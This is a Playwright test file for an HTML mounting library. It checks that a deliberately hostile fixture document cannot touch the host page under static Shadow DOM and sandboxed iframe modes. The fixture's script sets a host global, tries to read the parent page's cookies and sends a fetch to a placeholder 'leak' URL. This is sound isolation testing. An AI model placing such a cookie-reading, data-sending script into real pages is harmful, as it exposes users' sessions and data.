import { expect, test } from "@playwright/test";

// A deliberately hostile document: it tries to (1) pwn the host global, (2) reach
// the parent DOM, and (3) exfiltrate over the network. The tests assert each tier
// neutralises the right subset of these.
const HOSTILE = `<!doctype html><html><head><style>.box{color:rgb(7,8,9)}</style></head>
<body>
  <div class="box" id="c">payload</div>
  <script>
    window.__hostPwned = true;                 // lands on the HOST global only if it runs there
    var r = { ran: true, parent: 'pending', fetch: 'pending' };
    try { var ck = parent.document.cookie; r.parent = 'reached(' + ck.length + ')'; }
    catch (e) { r.parent = 'blocked:' + e.name; }
    var sent = false;
    function send(){ if (sent) return; sent = true; try { parent.postMessage({ hmmlTest: r }, '*'); } catch (e) {} }
    try {
      fetch('https://example.com/leak', { mode: 'no-cors' })
        .then(function(){ r.fetch = 'ok'; send(); })
        .catch(function(){ r.fetch = 'blocked'; send(); });
    } catch (e) { r.fetch = 'blocked'; send(); }
    setTimeout(function(){ if (r.fetch === 'pending') r.fetch = 'blocked'; send(); }, 1000);
  <\/script>
</body></html>`;

test.beforeEach(async ({ page }) => {
  await page.goto("/examples/mount/index.html");
  await page.waitForFunction(() => (window as any).__ready === true, undefined, { timeout: 20000 });
});

test("secure by default: no trust option → scripts never run in the host", async ({ page }) => {
  const out = await page.evaluate(async (html) => {
    const HMML = (window as any).HMML;
    const doc = await HMML.unpack(await HMML.pack(html));
    const handle = (window as any).mount(document.getElementById("host"), doc); // default
    await new Promise((r) => setTimeout(r, 250));
    const res = { trust: handle.trust, hostPwned: (window as any).__hostPwned === true };
    handle.dispose();
    return res;
  }, HOSTILE);

  expect(out.hostPwned, "the document's <script> must NOT execute in the host page").toBe(false);
  // static when the platform/sanitizer is available, else a safe sandbox fallback.
  expect(["static", "sandbox"]).toContain(out.trust);
});

test("static: Shadow DOM renders, strips the script, and isolates CSS both ways", async ({ page }) => {
  const out = await page.evaluate(async (html) => {
    const HMML = (window as any).HMML;
    const doc = await HMML.unpack(await HMML.pack(html));

    // a light-DOM element with the same class — proves the shadow style can't leak out
    const probe = document.createElement("div");
    probe.className = "box";
    document.body.appendChild(probe);

    // force the static path with a trivial caller sanitizer so this is deterministic
    // across browser versions (and also exercises the `sanitizer` option).
    const handle = (window as any).mount(document.getElementById("host"), doc, {
      sanitizer: (h: string) => h.replace(/<script[\s\S]*?<\/script>/gi, ""),
    });
    await new Promise((r) => setTimeout(r, 150));

    const sr = handle.element.shadowRoot;
    const inner = sr && sr.getElementById("c");
    const res = {
      trust: handle.trust,
      isDiv: handle.element.tagName === "DIV",
      hasShadow: !!sr,
      rendered: !!inner,
      scriptStripped: sr ? !sr.querySelector("script") : false,
      hostPwned: (window as any).__hostPwned === true,
      innerColor: inner ? getComputedStyle(inner).color : null, // inside shadow → styled
      probeColor: getComputedStyle(probe).color, // outside shadow → NOT styled
    };
    handle.dispose();
    (res as any).disposed = !document.getElementById("host")?.firstChild;
    probe.remove();
    return res;
  }, HOSTILE);

  expect(out.trust).toBe("static");
  expect(out.isDiv).toBe(true);
  expect(out.hasShadow).toBe(true);
  expect(out.rendered).toBe(true);
  expect(out.scriptStripped, "the <script> must be removed from the rendered tree").toBe(true);
  expect(out.hostPwned).toBe(false);
  expect(out.innerColor).toBe("rgb(7, 8, 9)"); // shadow style applied inside
  expect(out.probeColor).not.toBe("rgb(7, 8, 9)"); // and did NOT leak to the host
  expect((out as any).disposed).toBe(true);
});

test("sandbox: JS runs but is jailed — no parent DOM, no network, host untouched", async ({ page }) => {
  const out = await page.evaluate(async (html) => {
    const HMML = (window as any).HMML;
    const doc = await HMML.unpack(await HMML.pack(html));

    const report = new Promise<any>((resolve) => {
      function onMsg(e: MessageEvent) {
        if (e.data && e.data.hmmlTest) {
          window.removeEventListener("message", onMsg);
          resolve(e.data.hmmlTest);
        }
      }
      window.addEventListener("message", onMsg);
      setTimeout(() => resolve(null), 3000);
    });

    const handle = (window as any).mount(document.getElementById("host"), doc, { trust: "sandbox" });
    const r = await report;
    const res = {
      trust: handle.trust,
      tag: handle.element.tagName,
      sandboxAttr: handle.element.getAttribute("sandbox"),
      hostPwned: (window as any).__hostPwned === true,
      report: r,
    };
    handle.dispose();
    return res;
  }, HOSTILE);

  expect(out.trust).toBe("sandbox");
  expect(out.tag).toBe("IFRAME");
  expect(out.sandboxAttr).toBe("allow-scripts"); // crucially NOT allow-same-origin
  expect(out.hostPwned, "script ran in the iframe, never the host").toBe(false);

  expect(out.report, "the script must actually execute inside the sandbox").not.toBeNull();
  expect(out.report.ran).toBe(true);
  expect(out.report.parent, "must not reach the parent DOM").toMatch(/^blocked:/);
  expect(out.report.fetch, "CSP connect-src 'none' must cut the network").toBe("blocked");
});
